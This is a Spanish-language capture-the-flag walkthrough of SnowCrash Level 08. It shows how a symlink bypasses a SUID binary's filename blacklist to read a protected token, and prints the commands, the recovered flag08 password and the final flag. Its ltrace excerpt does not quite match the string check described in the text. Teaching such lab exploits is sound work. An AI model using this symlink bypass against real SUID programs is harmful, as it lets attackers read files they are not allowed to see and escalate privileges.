# SnowCrash - Level 08: Bypass de Control de Acceso mediante Enlaces Simbólicos

Este repositorio documenta la resolución del **Nivel 08**. El reto demuestra por qué las listas negras basadas en nombres de archivos son una medida de seguridad ineficaz y cómo los enlaces simbólicos pueden ser utilizados para evadir estas restricciones en binarios SUID.

## 1. Análisis Inicial

Al listar los archivos del nivel, encontramos un binario SUID y un archivo de datos protegido:

```bash
ls -la
# -rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
# -rw-------  1 flag08  flag08    26 Mar  5  2016 token

```

**Observaciones:**

* **`level08`**: Binario con bit **SUID** de `flag08`. Su función parece ser leer archivos.
* **`token`**: Archivo que contiene información sensible (la contraseña de `flag08`), pero solo es legible por su dueño.

---

## 2. Descubrimiento de la Vulnerabilidad

Al intentar ejecutar el binario directamente sobre el archivo `token`, el programa deniega el acceso:

```bash
./level08 token
# Salida: You may not access 'token'

```

### Análisis con `ltrace`

Al trazar las llamadas a funciones de librería, observamos que el programa utiliza una validación de cadena simple:

```text
printf("%s [file to read]\n", "./level08")
# ... (cuando se pasa un argumento)
access("token", W_OK) # Comprobación de seguridad superficial

```

**Fallo de Lógica:**
El programa no verifica el **contenido** o el **i-nodo** del archivo, sino que simplemente comprueba si el argumento proporcionado por el usuario contiene la palabra "token". Si la cadena no coincide, el programa procede a abrir el archivo con los privilegios del usuario SUID (`flag08`).

---

## 3. Estrategia de Explotación: Symlink Attack

Para evadir la restricción del nombre, creamos un **enlace simbólico**. Un enlace simbólico es un puntero en el sistema de archivos que nos permite referenciar el archivo `token` bajo un nombre distinto que no esté en la "lista negra" del binario.

### Paso 1: Creación del Enlace

Creamos un enlace en el directorio temporal `/tmp` con un nombre arbitrario (ej. `fakes`):

```bash
ln -s /home/user/level08/token /tmp/fakes

```

### Paso 2: Lectura del Archivo Protegido

Invocamos el binario SUID pasando como argumento nuestro enlace simbólico. Como la cadena `/tmp/fakes` no contiene la palabra "token", la validación falla (o mejor dicho, nosotros ganamos) y el programa abre el archivo original:

```bash
./level08 /tmp/fakes

```

**Resultado:** El binario imprime el contenido del archivo `token`.

* **Contenido obtenido:** `quif5eloekouj29ke0vouxean`

---

## 4. Escalada de Privilegios y Resolución

A diferencia de otros niveles, el contenido del archivo no es el flag final, sino la contraseña del usuario `flag08`.

1. **Cambio de usuario:**
```bash
su flag08
# Password: quif5eloekouj29ke0vouxean

```


2. **Obtención del Token:**
```bash
getflag

```

* **Token Final:** `25749xKZ8L7DkSCwJkT9dyv6f`

**Level 08 passed!**

---

## 5. Conclusiones Técnicas

* **Seguridad por Oscuridad:** Intentar proteger un recurso basándose únicamente en el nombre del archivo es una práctica insegura.
* **Enlaces Simbólicos:** En sistemas Unix, un enlace simbólico es transparente para la mayoría de las funciones de apertura de archivos (`open()`), lo que permite referenciar archivos protegidos bajo alias.
* **SUID Context:** El binario `level08` operaba con los privilegios de `flag08`, lo que le otorgaba permiso de lectura sobre `token` una vez superada la comprobación cosmética del nombre.

---